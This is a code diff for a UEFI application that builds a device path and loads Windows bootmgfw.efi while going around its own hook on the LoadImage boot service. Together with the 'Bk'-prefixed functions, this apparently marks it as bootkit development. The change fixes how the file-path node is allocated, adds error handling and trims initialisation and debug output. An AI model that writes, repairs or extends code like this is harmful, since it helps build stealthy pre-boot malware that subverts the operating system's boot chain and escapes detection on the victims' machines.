@@ -277,20 +277,35 @@ EFI_STATUS BkChainToBootManager(VOID)
     /* load bootmgfw.efi as an EFI image via boot services */
     EFI_HANDLE NewImageHandle = NULL;
 
-    /* build the full device path for bootmgfw.efi */
-    FILEPATH_DEVICE_PATH FileNode;
-    FileNode.Header.Type    = MEDIA_DEVICE_PATH;
-    FileNode.Header.SubType = MEDIA_FILEPATH_DP;
-
+    /* build file path device path node with proper allocation */
     CHAR16 *Path = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
-    UINTN PathSize = (StrLen(Path) + 1) * sizeof(CHAR16);
+    UINTN PathBytes = (StrLen(Path) + 1) * sizeof(CHAR16);
+    UINTN NodeSize = sizeof(EFI_DEVICE_PATH_PROTOCOL) + PathBytes;
 
-    SetDevicePathNodeLength(&FileNode.Header, sizeof(FileNode) - sizeof(CHAR16) + PathSize);
+    FILEPATH_DEVICE_PATH *FileNode = NULL;
+    gCtx.BootServices->AllocatePool(EfiBootServicesData, NodeSize, (VOID **)&FileNode);
+    if (!FileNode) {
+        BkConsolePrint(L"  [!] Failed to allocate device path node\r\n");
+        return EFI_OUT_OF_RESOURCES;
+    }
+
+    FileNode->Header.Type = MEDIA_DEVICE_PATH;
+    FileNode->Header.SubType = MEDIA_FILEPATH_DP;
+    SetDevicePathNodeLength(&FileNode->Header, (UINT16)NodeSize);
+    CopyMem(FileNode->PathName, Path, PathBytes);
 
     EFI_DEVICE_PATH_PROTOCOL *FullPath = AppendDevicePathNode(
+        gCtx.BootServices,
         BootmgfwDevPath,
-        (EFI_DEVICE_PATH_PROTOCOL *)&FileNode
+        (EFI_DEVICE_PATH_PROTOCOL *)FileNode
     );
+
+    gCtx.BootServices->FreePool(FileNode);
+
+    if (!FullPath) {
+        BkConsolePrint(L"  [!] Failed to build device path\r\n");
+        return EFI_OUT_OF_RESOURCES;
+    }
 
     /* use the ORIGINAL LoadImage to avoid our own hook here */
     Status = gCtx.OrigLoadImage(
@@ -342,13 +357,6 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
 
     SystemTable->ConOut->OutputString(SystemTable->ConOut,
         L"[DBG-2] context initialized\r\n");
-    SystemTable->BootServices->Stall(500000);
-
-    /* initialize UEFI library */
-    InitializeLib(ImageHandle, SystemTable);
-
-    SystemTable->ConOut->OutputString(SystemTable->ConOut,
-        L"[DBG-3] InitializeLib done\r\n");
     SystemTable->BootServices->Stall(500000);
 
     /* display banner */
